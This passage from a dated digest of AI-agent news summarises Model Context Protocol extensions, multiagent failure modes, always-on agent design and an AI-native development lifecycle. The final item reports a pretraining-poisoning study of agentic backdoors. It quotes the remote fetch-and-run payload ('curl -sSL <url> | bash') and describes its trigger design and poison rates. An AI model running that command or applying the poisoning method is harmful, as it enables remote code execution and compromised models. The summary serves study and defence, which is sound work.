  2. 2026-11-25R299MCP servers can ship skills, run background tasks and ask the userFour additions to the Model Context Protocol, three of them now generally available. <strong>Skills over MCP</strong> lets a server publish skills alongside its tools, loaded only when a task needs them, so idle skills cost no context and a skill updates whenever the server does with nothing separate for the user to install. <strong>Tasks</strong> let a server run a slow operation or a whole agent loop in the background and hand back the result when it is ready. <strong>Elicitation</strong> lets a server pause mid-call and ask the user for input through a form or a link before carrying on. <strong>File uploads</strong>, still experimental, let a document reach a server without passing through the context window. Why it matters: the server becomes the unit of distribution for know-how. Until now a skill was a folder you copied into a repository or a home directory; now the team that owns an API also owns the instructions for using it, versioned with the server. That fixes drift between tool and instructions, and it moves a prompt-injection surface onto the server — a skill is instructions the model follows, so a third-party server's skills deserve the same trust scrutiny as its code. Elicitation puts the human gate in the right place, in the code that performs the action rather than in the model's judgement about whether to ask. And tasks push the durable-execution pattern into the protocol itself. All four are open extensions or spec features, so other compatible clients can implement them.

  10. 2026-11-16R100Anthropic on multiagent failure modes: conformity, credulity and turf warsCoordination does not come from stronger individual models. A 45-agent swarm with a forum, peer review and an arbiter found 266 vulnerabilities vs 21 from parallel agents, mostly by covering more code (12 overlap). Identical agents are low-variance: 18 of 30 picked the same branch name, uncoordinated job-queue agents sent 2.4M requests for 117 accepted jobs, and pricing agents colluded by round 3. Peers are credulous yet bury pivotal private facts (hidden-profile groups 17 to 36%, Mythos 5 about 85%).   11. 2026-11-15R084Building always-on agents: five primitives for agents that sleep, wake and act"Always-on" is a UX: the agent sleeps and wakes for short runs (event in, act, persist, sleep) inside new or resumed sessions. Five primitives, each its own durable store or service: an event inbox (every trigger appends a row; fast-ack handler; inbox as source of truth so crashed runs retry; one worker per inbox; batch pending events; dedupe by source ID), timers (follow-ups vs schedules in a separate store; a polling scheduler enqueues events, never starts runs), memory (files on durable storage; only what can't be looked up again, pointers otherwise; user instructions, user notes, past messages, per-task progress; optional dreaming), permissions (credential-injecting proxy outside the agent, classifier-backed auto mode, deferred tool calls that end the run and resume when the answer arrives as an inbox event) and an outbox (send / nothing / defer; a table plus dispatcher for pacing and retries; eval message volume, start quiet). Cites 78% lower cost per solved task on a long-horizon coding benchmark across model generations. Doc adds failure modes (double runs, retry side effects, timer storms, approval limbo, unattended injection) and a 12-point review checklist.

  12. 2026-11-12R058AI-native SDLC: Anthropic's playbook vs AWS AI-DLCFaster build moves the bottleneck to plan, review and deploy, so redesign the lifecycle. The playbook: six non-linear stages of "plays", each committing an artifact the next reads (`intent.md`, `spec.md`, `plan.md`, diff and tests, PR findings, incident record); an accepted artifact fires the next stage and the commit chain is the audit trail. Useful specifics: a leading and lagging metric per play read from git and PR metadata; skills are advisory, hooks and managed settings deterministic; `CLAUDE.md`, skills and hooks regression-tested by a CI eval suite, every incident becomes an eval; failing test first, then a hook blocks test edits during the fix; the writing agent cannot approve; Maintain closes the loop with deterministic sigma bands (log, diagnose read-only, propose via PR or pre-approved runbook) that write a new `intent.md`. AI-DLC is the engine (adaptive depth), the playbook the operating model. Weak spots: vendor-shaped, no outcome data, four Markdown files per change can drift, rationale stays per change, no rule for when a small fix skips intent and spec.

  13. 2026-11-12R053Agentic backdoors via pretraining poisoningAn outside attacker who only gets web text into the pretraining crawl plants a remote code execution backdoor (`curl -sSL <url> | bash`) that survives a fully clean SFT, DPO and GRPO agent pipeline. Qwen3 0.6B/1.7B/4B pretrained from scratch on 100B FineWeb tokens: at 0.1% poison the 4B CLI agent fires on 92.7% (Pass@32) of prompts whose file paths contain a provider name (an ordinary-string trigger the victim's own machine supplies, generalizing to unseen paths) and 10.5% with an injected rare string; 0.0% on clean prompts and no capability loss. ASR rises monotonically with size; still 1.4% at 0.0005% (about 2,500 documents). Declaration poison (prose that states the rule, like a commit message) beats chat-transcript demonstrations (92.7% vs 3.2%) and is harder to filter. Defense: guard the action (sandbox, least privilege, egress, allow-lists, confirmation, pre-execution classifiers). Caveats: small models only, one fixed payload, single-seed low-rate runs, defenses not evaluated.
